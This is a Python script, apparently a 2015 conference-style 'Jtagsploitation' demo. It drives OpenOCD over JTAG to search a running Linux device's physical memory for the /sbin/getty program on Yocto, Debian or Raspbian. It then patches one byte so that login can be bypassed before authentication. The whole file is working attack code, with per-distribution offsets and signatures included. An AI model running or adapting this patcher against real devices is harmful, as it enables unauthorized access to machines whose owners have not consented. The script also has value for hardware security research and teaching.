#!/usr/bin/env python3
# Jtagsploitation demo, covered by GNU GPLv3 or later
# Copyright (C) 2015 by @syncsrc (jtag@syncsrc.org)
# OpenOCD RPC example Copyright (C) 2014 by Andreas Ortmann (ortmann@finf.uni-hannover.de)

info = """
Linux Getty preauthentication patch, applied via JTAG using OpenOCD.
"""
# Ported from slotscreamer inception module:
# https://github.com/carmaa/inception/commit/d77988d7c1e9aca255728e1778a5fcde24ff3172


import socket
import itertools
import time
import argparse

# Known signatures for /sbin/getty executable
#                      offset  signature1  signature2
targets = {"yocto":    [0x7c9, 0x25002d2d, 0x63203a73],
           "debian":   [0x4a6, 0x25002d2d, 0x63203a73],
           "raspbian": [0x4ec, 0x00002d2d, 0x6c697475] }

def strToHex(data):
    return map(strToHex, data) if isinstance(data, list) else int(data, 16)

def hexify(data):
    return "<None>" if data is None else ("0x%08x" % data)


class OpenOcd:
    COMMAND_TOKEN = '\x1a'
    def __init__(self, verbose=False):
        self.verbose        = verbose
        self.tclRpcIp       = "127.0.0.1"
        self.tclRpcPort     = 6666
        self.bufferSize     = 4096

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def __enter__(self):
        self.sock.connect((self.tclRpcIp, self.tclRpcPort))
        return self

    def __exit__(self, type, value, traceback):
        try:
            self.send("exit")
        finally:
            self.sock.close()

    def send(self, cmd):
        """Send a command string to TCL RPC. Return the result that was read."""
        data = (cmd + OpenOcd.COMMAND_TOKEN).encode("utf-8")
        if self.verbose:
            print("<- ", data)

        self.sock.send(data)
        return self._recv()

    def _recv(self):
        """Read from the stream until the token (\x1a) was received."""
        data = bytes()
        while True:
            chunk = self.sock.recv(self.bufferSize)
            data += chunk
            if bytes(OpenOcd.COMMAND_TOKEN, encoding="utf-8") in chunk:
                break

        if self.verbose:
            print("-> ", data)

        data = data.decode("utf-8").strip()
        data = data[:-1] # strip trailing \x1a

        return data

    def readDword(self, address):
        raw = self.send("ocd_mdw phys 0x%x" % address).split(": ")
        return None if (len(raw) < 2) else strToHex(raw[1])

    def writeByte(self, address, value):
        assert value is not None
        self.send("mwb phys 0x%x 0x%x" % (address, value))


if __name__ == "__main__":

    def auto_int(x):
        return int(x, 0)

    valid = ', '.join(list(targets.keys()))
    
    parser = argparse.ArgumentParser(description=info)
    parser.add_argument('-t', '--target', required=True,
                        help='valid targets are: ' + valid)
    parser.add_argument('-f', '--first', action="store_true",
                        help='stop running script after first successful patch')
    parser.add_argument('-s', '--start', default=0, type=auto_int,
                        help='address to start search (default = 0x0)')
    parser.add_argument('-e', '--end', default=0xfffff000, type=auto_int,
                        help='address to stop search (default = 0xfffff000)')
    opts = parser.parse_args()

    if opts.target in targets:
        offset = targets[opts.target][0]
        signature1 = targets[opts.target][1]
        signature2 = targets[opts.target][2]
    else:
        raise Exception('Unsupported target specified: ' + opts.target)

    done = False
    with OpenOcd() as ocd:
        ocd.send("reset")

        for base in range(opts.start, opts.end, 0x1000000):

            print(ocd.send("capture \"ocd_halt\"")[:-1])

            for addr in range(base+offset, base+0x1000000, 0x1000):
                value1 = ocd.readDword(addr)
                if value1 == signature1:
                    value2 = ocd.readDword(addr+4)
                    print("%s: %s %s" % (hexify(addr), hexify(value1), hexify(value2)))
                    if value2 == signature2:
                        ocd.writeByte(addr+1, 0x66)
                        print("Paching %s to 0x66" % (hexify(addr+1)))
                        if opts.first:
                            done = True
                            break
                        
            ## Some targets have a habit of dying if not allowed to run a little
            ocd.send("resume")
            if done:
                break
            time.sleep(2)
